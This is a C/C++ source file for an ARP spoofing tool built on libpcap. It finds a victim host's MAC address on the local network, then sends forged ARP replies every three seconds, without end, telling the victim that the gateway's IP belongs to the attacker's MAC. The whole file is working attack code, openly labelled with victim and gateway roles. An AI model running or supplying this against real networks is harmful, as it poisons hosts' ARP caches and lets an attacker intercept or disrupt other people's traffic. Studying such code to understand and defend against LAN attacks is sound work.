#include <arpa/inet.h>
#include <libnet.h>
#include <pcap.h>
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define REQUEST 1
#define REPLY 2
#define ETH_HDR_LEN 14
#define ETH_TYPE_ARP 0x0806


// ethernet header
struct ETHERNET {
	uint8_t dmac[6];
	uint8_t smac[6];
	uint16_t type;
};

// arp header
#pragma pack(1) // alloc memory to variables by 1 bytes (default is 4bytes)
struct ARP {
	uint16_t hdw_type;
	uint16_t pro_type;
	uint8_t  hdw_len;
	uint8_t  pro_len;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint32_t sender_ip :32;
	uint8_t target_mac[6];
	uint32_t target_ip :32;
};

void print_mac(uint8_t *mac) {
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void print_ip(uint32_t ip) {
	printf("%d.%d.%d.%d\n", ip & 0xff, (ip>>8) & 0xff, (ip>>16) & 0xff, ip>>24);
}


ETHERNET make_eth_hdr(uint8_t *s_mac, uint8_t *d_mac) {
	ETHERNET eth;
	memcpy(&eth.dmac, d_mac, 6);
	memcpy(&eth.smac, s_mac, 6);
	eth.type = htons(ETH_TYPE_ARP);

	return eth;
}


ARP make_arp_hdr(int opcode, uint8_t *sender_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip) {
	ARP arp;
	arp.hdw_type = htons(0x0001);
	arp.pro_type = htons(0x0800);
	arp.hdw_len = 0x06;
	arp.pro_len = 0x04;
	arp.opcode = htons(opcode);
	memcpy(&arp.sender_mac, sender_mac, 6);
	arp.sender_ip = sender_ip;
	memcpy(&arp.target_mac, target_mac, 6);
	arp.target_ip = target_ip;
	return arp;
}


// get my mac address from ioctl
void getMacAddress(char *iface ,uint8_t *my_mac) {
	int fd;
	struct ifreq ifr;
	char *mac;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char*)ifr.ifr_name, (const char*)iface, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (char *)ifr.ifr_hwaddr.sa_data;
	memcpy(my_mac, mac,6);
}

// get my ip address from ioctl
void getIpAddress(char *iface, uint32_t &my_ip) {
	int fd;
	struct ifreq ifr;
	uint32_t ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char*)ifr.ifr_name, (const char*)iface, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
	my_ip = ip;
}

// make ARP packet
void *make_arp(u_char *packet, uint8_t *s_mac, uint8_t *d_mac, int opcode, 
		uint8_t *sender_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip, int *packet_len) {
	
	ETHERNET eth = make_eth_hdr(s_mac, d_mac);
	ARP arp = make_arp_hdr(opcode, sender_mac, sender_ip, target_mac, target_ip);
	
	memcpy(packet, &eth, sizeof(eth));
	*packet_len += sizeof(eth);
	memcpy(packet+*packet_len, &arp, sizeof(arp));
	*packet_len += sizeof(arp);
}


// find sender's mac address from sender's ip address by arp protocol
int find_sender_mac(const u_char *packet, uint8_t *sender_mac, uint32_t sender_ip, uint32_t my_ip) {
	ETHERNET *eth = (struct ETHERNET*) packet;
	if (ntohs(eth->type) == ETH_TYPE_ARP) {
		ARP *arp = (struct ARP*) &packet[ETH_HDR_LEN];
		
		if (htons(arp->opcode) == 0x2 			// if arp reply packet
			&& arp->target_ip == my_ip 			// if destination ip is my ip
			&& arp->sender_ip == sender_ip) {	// if source ip is sender ip

			memcpy(sender_mac, arp->sender_mac, 6);
			return 1;
		}
	}
	return 0;
}


void usage() {
	printf("syntax: ./send_arp <interface> <sender_ip> <target_ip>\n");
	printf("sample: ./send_arp ens33 192.168.10.2 192.168.10.1\n");
}

//============================
//	sender = victim
//	target = gateway
//============================

int main(int argc, char *argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	uint8_t sender_mac[6];
	uint8_t my_mac[6];
	uint8_t broadcast_mac[6];
	uint8_t unknown_mac[6];

	getMacAddress(argv[1], my_mac);
	memset(broadcast_mac, 0xff, 6);
	memset(unknown_mac, 0x00, 6);

	uint32_t my_ip;
	uint32_t sender_ip = inet_addr(argv[2]);
	uint32_t target_ip = inet_addr(argv[3]);
	getIpAddress(argv[1], my_ip);

	printf("=================== ARP SPOOFING ===================\n");
	printf("[+] My MAC address\t\t: ");
	print_mac(my_mac);
	printf("[+] My IP address\t\t: ");
	print_ip(my_ip);
	printf("[+] Attacker's MAC address\t: ");
	print_mac(my_mac);
	printf("[+] Attacker's IP address\t: ");
	print_ip(target_ip);

	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s - %s\n", argv[1], errbuf);
		return -1;
	}

	// make request packet (broadcast)
	int packet_len = 0;
	u_char request_packet[100];
	memset(request_packet, 0, 100);

	make_arp(request_packet, my_mac, broadcast_mac, REQUEST, my_mac, my_ip, unknown_mac, sender_ip, &packet_len);

	int count = 0;
	while (true) {
		// send requset packet until get sender's arp reply packet
		if (count % 10 == 0) {
			pcap_sendpacket(handle, request_packet, packet_len);
			printf("\n[*] Send request packet to sender(victim)!\n");
			count = 0;
		}
		struct pcap_pkthdr *header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		if (find_sender_mac(packet, sender_mac, sender_ip, my_ip))
			break;
	}

	printf("[*] Find Victim's MAC address!!\n");
	printf("\n[+] Victim's MAC address\t: ");
	print_mac(sender_mac);
	printf("[+] Victim's IP address\t\t: ");
	print_ip(sender_ip);

	u_char attack_packet[100];
	memset(attack_packet, 0, 100);

	// make attack packet (unicast)
	packet_len = 0;
	make_arp(attack_packet, my_mac, sender_mac, REPLY, my_mac, target_ip, sender_mac, sender_ip, &packet_len);

	printf("\n[*] Sending attack packet to sender(victim)!\n");
	while (true) {
		pcap_sendpacket(handle, attack_packet, packet_len);
		sleep(3);
	}
}
